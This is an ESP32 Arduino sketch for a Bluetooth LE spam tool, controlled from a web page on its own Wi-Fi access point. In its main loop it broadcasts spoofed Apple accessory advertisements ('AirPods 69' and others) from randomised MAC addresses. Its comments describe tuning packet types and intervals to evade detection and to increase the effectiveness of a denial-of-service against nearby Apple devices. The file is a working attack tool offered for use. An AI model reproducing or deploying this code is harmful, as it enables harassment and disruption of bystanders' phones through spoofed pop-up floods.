// This example takes heavy inpsiration from the ESP32 example by ronaldstoner
// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
// Thanks to ckcr4lyf and many others
// Load Wi-Fi library
#include <WiFi.h>
#include <WebServer.h>
#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include "devices.hpp"
BLEAdvertising *pAdvertising;  // global variable
uint32_t delaySeconds = 1;
// Replace with your AP credentials
const char* ssid = "PUA"; //SSID
const char* password = "12345ttttt"; //Password
const int ledPin = 2; // GPIO pins connected to the board
bool ledState = false; // LED status now
// Set web server port number to 8184
WebServer server(8184);

// Variable to store the HTTP request
String header;

// Auxiliar variables to store the current output state
String output26State = "off";
String output27State = "off";

// Assign output variables to GPIO pins
const int output26 = 26;
const int output27 = 27;

// Current time
unsigned long currentTime = millis();
// Previous time
unsigned long previousTime = 0; 
// Define timeout time in milliseconds (example: 2000ms = 2s)
const long timeoutTime = 2000;


// HTML for the web page
const char* htmlPage = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>ESP32 Control</title><style>body{font-family:Arial,sans-serif;text-align:center;margin-top:50px}.button{background-color:#4CAF50;border:none;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;margin:4px 2px;cursor:pointer;border-radius:8px}.button.off{background-color:#f44336}.state{font-size:24px;margin-top:20px}</style></head><body><h1>ESP32 AP Mode BLE Spamming Control</h1><p class="state">LED and BLE spamming is: <span id="ledStatus">%LED_STATE%</span></p><button class="button %BUTTON_COLOR%" onclick="toggleLED()">Turn %BUTTON_TEXT%</button><script>function toggleLED(){var x=new XMLHttpRequest();x.onreadystatechange=function(){if(this.readyState==4&&this.status==200){document.getElementById("ledStatus").innerHTML=this.responseText;var b=document.querySelector(".button");if(this.responseText==="ON"){b.classList.remove("off");b.innerHTML="Turn OFF"}else{b.classList.add("off");b.innerHTML="Turn ON"}}};x.open("GET","/toggle",true);x.send()}window.onload=function(){var x=new XMLHttpRequest();x.onreadystatechange=function(){if(this.readyState==4&&this.status==200){document.getElementById("ledStatus").innerHTML=this.responseText;var b=document.querySelector(".button");if(this.responseText==="ON"){b.classList.remove("off");b.innerHTML="Turn OFF"}else{b.classList.add("off");b.innerHTML="Turn ON"}}};x.open("GET","/state",true);x.send()};</script></body></html>
)rawliteral";


// Function to handle the root URL "/"
void handleRoot() {
  String s = String(htmlPage);
  s.replace("%LED_STATE%", ledState ? "ON" : "OFF");
  s.replace("%BUTTON_TEXT%", ledState ? "OFF" : "ON");
  s.replace("%BUTTON_COLOR%", ledState ? "" : "off"); // Add 'off' class for red button
  server.send(200, "text/html", s);
}

// Function to handle the "/toggle" URL
void handleToggle() {
  if (ledState == true) {
    ledState = false;
    BLEDevice::deinit();
	// Turn lights off while off
	digitalWrite(12, LOW);
	digitalWrite(13, LOW);
	//turn off bluetooth and stop
  } else {
    ledState = true;
    BLEDevice::init("AirPods 69");
	// Turn lights on while spamming
	digitalWrite(12, HIGH);
	digitalWrite(13, HIGH);
	//turn on bluetooth and continue
  }
  digitalWrite(ledPin, ledState);
  server.send(200, "text/plain", ledState ? "ON" : "OFF");
}

// handle request from "/state"
void handleState() {
  server.send(200, "text/plain", ledState ? "ON" : "OFF");
}

void setup() {
  Serial.begin(115200);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, ledState);

  Serial.print("Setting up AP (Access Point)...");
  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);

  server.on("/", handleRoot);
  server.on("/toggle", handleToggle);
  server.on("/state", handleState);

  server.begin();
  Serial.println("HTTP server started");
  pinMode(12, OUTPUT);
  pinMode(13, OUTPUT);
  BLEDevice::init("AirPods 69");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}


void loop() {
  server.handleClient();

  // First generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we 
    // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Randomly pick data from one of the devices
  // First decide short or long
  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
  int device_choice = random(2);
  if (device_choice == 0){
    int index = random(17);
    oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
  } else {
    int index = random(17);
    oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
  }

/*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
      the three advertising PDU types when you want to connect to Apple devices.
          // 0 = ADV_TYPE_IND, 
          // 1 = ADV_TYPE_SCAN_IND
          // 2 = ADV_TYPE_NONCONN_IND
      
      Randomly using any of these PDU types may increase detectability of spoofed packets. 

      What we know for sure:
      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
  */
  
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // Set the device address, advertisement data
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // Set advertising interval
  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
      
      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
  */

  //pAdvertising->setMinInterval(0x20);
  //pAdvertising->setMaxInterval(0x20);
  //pAdvertising->setMinPreferred(0x20);
  //pAdvertising->setMaxPreferred(0x20);

  // Start advertising
  Serial.println("Sending Advertisement...");
  pAdvertising->start();


  delay(delaySeconds * 1000); // delay for delaySeconds seconds
  pAdvertising->stop();
}
